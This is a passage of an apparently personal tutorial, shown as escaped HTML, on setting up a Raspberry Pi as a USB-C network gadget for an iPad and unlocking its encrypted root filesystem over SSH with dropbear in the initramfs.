&lt;span id=&quot;cb11-11&quot;&gt;&lt;a href=&quot;#cb11-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-12&quot;&gt;&lt;a href=&quot;#cb11-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;systemctl&lt;/span&gt; daemon-reload&lt;/span&gt;
&lt;span id=&quot;cb11-13&quot;&gt;&lt;a href=&quot;#cb11-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;systemctl&lt;/span&gt; enable dnsmasq.service&lt;/span&gt;
&lt;span id=&quot;cb11-14&quot;&gt;&lt;a href=&quot;#cb11-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;systemctl&lt;/span&gt; enable usb0.service&lt;/span&gt;
&lt;span id=&quot;cb11-15&quot;&gt;&lt;a href=&quot;#cb11-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-16&quot;&gt;&lt;a href=&quot;#cb11-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-17&quot;&gt;&lt;a href=&quot;#cb11-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-18&quot;&gt;&lt;a href=&quot;#cb11-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Second moment of truth: Shut down the system, remove the power, and connect the Pi to your iPad over USB C. The Pi should power on, and then shortly after you unlock the ROOTFS the iPad should be assigned an IPv4 address via the ethernet device &quot;Kali Linux&quot;. You should then be able to SSH in as kali@10.55.0.1.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.hardill.me.uk/wordpress/2019/11/02/pi4-usb-c-gadget/&quot;&gt;Pi4 USB-C Gadget&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://e2e.ti.com/support/processors-group/processors/f/processors-forum/627474/linux-am3352-dynamic-reconfiguration-of-usb-gadget&quot;&gt;Dynamic reconfiguration of USB Gadget&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=720987&quot;&gt;initramfs-tools: network isn't deconfigured which breaks networking initscript&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://openwrt.org/docs/guide-user/hardware/usb_gadget&quot;&gt;USB Guest configuration&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;rootfs-unlock-over-ssh&quot;&gt;ROOTFS Unlock Over SSH&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb12&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb12-1&quot;&gt;&lt;a href=&quot;#cb12-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-2&quot;&gt;&lt;a href=&quot;#cb12-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-3&quot;&gt;&lt;a href=&quot;#cb12-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -s&lt;/span&gt;
&lt;span id=&quot;cb12-4&quot;&gt;&lt;a href=&quot;#cb12-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-5&quot;&gt;&lt;a href=&quot;#cb12-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Install dropbear + initramfs hooks.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-6&quot;&gt;&lt;a href=&quot;#cb12-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-7&quot;&gt;&lt;a href=&quot;#cb12-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;apt&lt;/span&gt; install dropbear-initramfs&lt;/span&gt;
&lt;span id=&quot;cb12-8&quot;&gt;&lt;a href=&quot;#cb12-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-9&quot;&gt;&lt;a href=&quot;#cb12-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Align dropbear SSH host keys with OpenSSH. Normally this&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-10&quot;&gt;&lt;a href=&quot;#cb12-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# isn&amp;#39;t considered a best practice, but...&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-11&quot;&gt;&lt;a href=&quot;#cb12-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-12&quot;&gt;&lt;a href=&quot;#cb12-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     (1) We&amp;#39;re only ever connecting to the Pi over usb0, not&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-13&quot;&gt;&lt;a href=&quot;#cb12-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#         an open network (or, god forbid, the internet).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-14&quot;&gt;&lt;a href=&quot;#cb12-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     (2) We&amp;#39;re actually going to take steps in a moment to&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-15&quot;&gt;&lt;a href=&quot;#cb12-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#         MAKE SURE that (1) is true.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-16&quot;&gt;&lt;a href=&quot;#cb12-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-17&quot;&gt;&lt;a href=&quot;#cb12-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Since we&amp;#39;re only connecting to the Pi via SSH over a SINGLE&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-18&quot;&gt;&lt;a href=&quot;#cb12-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# cable, using a private IP address, and with SSH host keys&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-19&quot;&gt;&lt;a href=&quot;#cb12-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# that are unique to this device, the danger of having these&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-20&quot;&gt;&lt;a href=&quot;#cb12-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# keys disclosed in the event that someone got ahold of the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-21&quot;&gt;&lt;a href=&quot;#cb12-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Pi&amp;#39;s microSD card seems minimal (after all, such an attacker&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-22&quot;&gt;&lt;a href=&quot;#cb12-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# could just trojan the initramfs.zst directly).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-23&quot;&gt;&lt;a href=&quot;#cb12-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-24&quot;&gt;&lt;a href=&quot;#cb12-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# (Note that you should make sure to set an EMPTY password&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-25&quot;&gt;&lt;a href=&quot;#cb12-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# when using ssh-keygen to convert they keys to PEM format, as&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-26&quot;&gt;&lt;a href=&quot;#cb12-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# dropbear doesn&amp;#39;t support password-protected host keys.)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-27&quot;&gt;&lt;a href=&quot;#cb12-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-28&quot;&gt;&lt;a href=&quot;#cb12-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;cd&lt;/span&gt; /etc/dropbear/initramfs&lt;/span&gt;
&lt;span id=&quot;cb12-29&quot;&gt;&lt;a href=&quot;#cb12-29&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;rm&lt;/span&gt; -f dropbear_*_host_key&lt;/span&gt;
&lt;span id=&quot;cb12-30&quot;&gt;&lt;a href=&quot;#cb12-30&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cp&lt;/span&gt; /etc/ssh/ssh_host_*_key .&lt;/span&gt;
&lt;span id=&quot;cb12-31&quot;&gt;&lt;a href=&quot;#cb12-31&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;SSH_KEY&lt;/span&gt; in &lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;ls&lt;/span&gt; -1 ssh_host_*_key&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;do&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-32&quot;&gt;&lt;a href=&quot;#cb12-32&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;va&quot;&gt;DROPBEAR_KEY=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$SSH_KEY&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-33&quot;&gt;&lt;a href=&quot;#cb12-33&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;fu&quot;&gt;sed&lt;/span&gt; -e &lt;span class=&quot;st&quot;&gt;&amp;#39;s/ssh_host_\(.*\)_key/dropbear_\1_host_key/&amp;#39;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-34&quot;&gt;&lt;a href=&quot;#cb12-34&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;ssh-keygen&lt;/span&gt; -m PEM -p -f &lt;span class=&quot;va&quot;&gt;$SSH_KEY&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-35&quot;&gt;&lt;a href=&quot;#cb12-35&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;dropbearconvert&lt;/span&gt; openssh dropbear &lt;span class=&quot;va&quot;&gt;$SSH_KEY&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$DROPBEAR_KEY&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-36&quot;&gt;&lt;a href=&quot;#cb12-36&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;rm&lt;/span&gt; -f &lt;span class=&quot;va&quot;&gt;$SSH_KEY&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-37&quot;&gt;&lt;a href=&quot;#cb12-37&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;done&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-38&quot;&gt;&lt;a href=&quot;#cb12-38&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-39&quot;&gt;&lt;a href=&quot;#cb12-39&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# At this point you&amp;#39;ll need to add your SSH public keys to&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-40&quot;&gt;&lt;a href=&quot;#cb12-40&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# /etc/dropbear/initramfs/authorized_keys. I&amp;#39;m not writing out&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-41&quot;&gt;&lt;a href=&quot;#cb12-41&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# this step explicitly though; you could be generating a new&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-42&quot;&gt;&lt;a href=&quot;#cb12-42&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# keypair here, using keys you copied over when setting up the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-43&quot;&gt;&lt;a href=&quot;#cb12-43&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# encrypted microSD card, or just copying&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-44&quot;&gt;&lt;a href=&quot;#cb12-44&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# ~/.ssh/authorized_keys (and making sure that the permissions&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-45&quot;&gt;&lt;a href=&quot;#cb12-45&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# are right!). You do you.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-46&quot;&gt;&lt;a href=&quot;#cb12-46&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-47&quot;&gt;&lt;a href=&quot;#cb12-47&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# That said!&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-48&quot;&gt;&lt;a href=&quot;#cb12-48&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-49&quot;&gt;&lt;a href=&quot;#cb12-49&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# As a fan of per-host keys I&amp;#39;m not in love with this step,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-50&quot;&gt;&lt;a href=&quot;#cb12-50&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# since it means that if I reset my iPad then I need an&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-51&quot;&gt;&lt;a href=&quot;#cb12-51&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# external keyboard to unlock the Pi before I can copy over&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-52&quot;&gt;&lt;a href=&quot;#cb12-52&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# the new public key. Unfortunately, I don&amp;#39;t see any way to&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-53&quot;&gt;&lt;a href=&quot;#cb12-53&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# support a password-based login (which I think is &amp;quot;secure&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-54&quot;&gt;&lt;a href=&quot;#cb12-54&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# enough&amp;quot; in here for the same reason that I think that&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-55&quot;&gt;&lt;a href=&quot;#cb12-55&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# re-using the SSH host keys is &amp;quot;secure enough&amp;quot; in this&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-56&quot;&gt;&lt;a href=&quot;#cb12-56&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# particular context) without modifying dropbear&amp;#39;s initramfs&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-57&quot;&gt;&lt;a href=&quot;#cb12-57&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# setup hook (which I&amp;#39;d rather not do, as any changes will be&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-58&quot;&gt;&lt;a href=&quot;#cb12-58&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# overwritten if the dropbear-initramfs package is updated).&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-59&quot;&gt;&lt;a href=&quot;#cb12-59&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-60&quot;&gt;&lt;a href=&quot;#cb12-60&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Add dropbear configuration options. In particular, for an&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-61&quot;&gt;&lt;a href=&quot;#cb12-61&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# unlock of ROOTFS on successful login.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-62&quot;&gt;&lt;a href=&quot;#cb12-62&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-63&quot;&gt;&lt;a href=&quot;#cb12-63&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sed&lt;/span&gt; -i -e &lt;span class=&quot;st&quot;&gt;&amp;#39;s;^#DROPBEAR_OPTIONS=$;DROPBEAR_OPTIONS=&amp;quot;-jks -c /usr/bin/cryptroot-unlock-ssh&amp;quot;;&amp;#39;&lt;/span&gt; /etc/dropbear/initramfs/config&lt;/span&gt;
&lt;span id=&quot;cb12-64&quot;&gt;&lt;a href=&quot;#cb12-64&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-65&quot;&gt;&lt;a href=&quot;#cb12-65&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-66&quot;&gt;&lt;a href=&quot;#cb12-66&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb12-67&quot;&gt;&lt;a href=&quot;#cb12-67&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create /usr/local/sbin/cryptroot-unlock-ssh.sh:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb13&quot;&gt;&lt;pre class=&quot;sourceCode sh&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb13-1&quot;&gt;&lt;a href=&quot;#cb13-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-2&quot;&gt;&lt;a href=&quot;#cb13-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-3&quot;&gt;&lt;a href=&quot;#cb13-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;ROOTFS_DEV=&lt;/span&gt;crypt_rootfs&lt;/span&gt;
&lt;span id=&quot;cb13-4&quot;&gt;&lt;a href=&quot;#cb13-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-5&quot;&gt;&lt;a href=&quot;#cb13-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt; [&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;-b&lt;/span&gt; /dev/mapper/&lt;span class=&quot;va&quot;&gt;$ROOTFS_DEV&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt; ]&lt;/span&gt;; &lt;span class=&quot;kw&quot;&gt;then&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-6&quot;&gt;&lt;a href=&quot;#cb13-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt; [&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;-f&lt;/span&gt; /cryptroot/crypttab&lt;span class=&quot;bu&quot;&gt; ]&lt;/span&gt;; &lt;span class=&quot;kw&quot;&gt;then&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-7&quot;&gt;&lt;a href=&quot;#cb13-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;va&quot;&gt;ROOTFS_UID=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$ROOTFS_DEV&lt;/span&gt; /cryptroot/crypttab &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;cut&lt;/span&gt; -d &lt;span class=&quot;st&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt; -f 2&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-8&quot;&gt;&lt;a href=&quot;#cb13-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;elif&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt; [&lt;/span&gt; &lt;span class=&quot;ot&quot;&gt;-f&lt;/span&gt; /etc/crypttab&lt;span class=&quot;bu&quot;&gt; ]&lt;/span&gt;; &lt;span class=&quot;kw&quot;&gt;then&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-9&quot;&gt;&lt;a href=&quot;#cb13-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;va&quot;&gt;ROOTFS_UID=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$ROOTFS_DEV&lt;/span&gt; /etc/crypttab &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;cut&lt;/span&gt; -f 2&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-10&quot;&gt;&lt;a href=&quot;#cb13-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-11&quot;&gt;&lt;a href=&quot;#cb13-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-12&quot;&gt;&lt;a href=&quot;#cb13-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-13&quot;&gt;&lt;a href=&quot;#cb13-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb13-14&quot;&gt;&lt;a href=&quot;#cb13-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;/usr/sbin/cryptsetup&lt;/span&gt; luksOpen &lt;span class=&quot;va&quot;&gt;$ROOTFS_UID&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$ROOTFS_DEV&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;killall&lt;/span&gt; cryptroot&lt;/span&gt;
&lt;span id=&quot;cb13-15&quot;&gt;&lt;a href=&quot;#cb13-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create /usr/share/initramfs-tools/hooks/cryptroot-unlock-ssh:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb14&quot;&gt;&lt;pre class=&quot;sourceCode sh&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb14-1&quot;&gt;&lt;a href=&quot;#cb14-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#!/bin/sh&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-2&quot;&gt;&lt;a href=&quot;#cb14-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb14-3&quot;&gt;&lt;a href=&quot;#cb14-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;PREREQ=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
